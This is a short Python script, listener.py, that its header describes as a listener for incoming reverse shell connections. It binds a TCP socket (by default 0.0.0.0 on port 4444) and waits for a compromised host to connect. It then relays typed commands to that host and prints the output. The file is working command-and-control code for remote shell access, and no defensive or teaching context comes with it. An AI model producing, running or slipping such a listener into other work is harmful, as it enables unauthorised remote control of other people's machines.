# listener.py - Runs the listener to accept incoming reverse shell connections

import socket

def start_listener(ip, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, int(port)))
    server.listen(1)
    print(f"\n🔌 Listening on {ip}:{port} ... Waiting for connection.")

    conn, addr = server.accept()
    print(f"📡 Connection received from {addr[0]}:{addr[1]}")

    while True:
        try:
            command = input("Shell> ")
            if command.strip().lower() == 'exit':
                conn.sendall(command.encode() + b'\n')
                break
            conn.sendall(command.encode() + b'\n')
            data = b""
            while True:
                part = conn.recv(4096)
                data += part
                if len(part) < 4096:
                    break
            print(data.decode(errors="ignore"))
        except Exception as e:
            print(f"❌ Connection error: {e}")
            break

    conn.close()
    server.close()

def main():
    listen_ip = input("Enter IP to bind listener on [default: 0.0.0.0]: ").strip() or "0.0.0.0"
    listen_port = input("Enter port to listen on [default: 4444]: ").strip() or "4444"
    start_listener(listen_ip, listen_port)

if __name__ == "__main__":
    main()
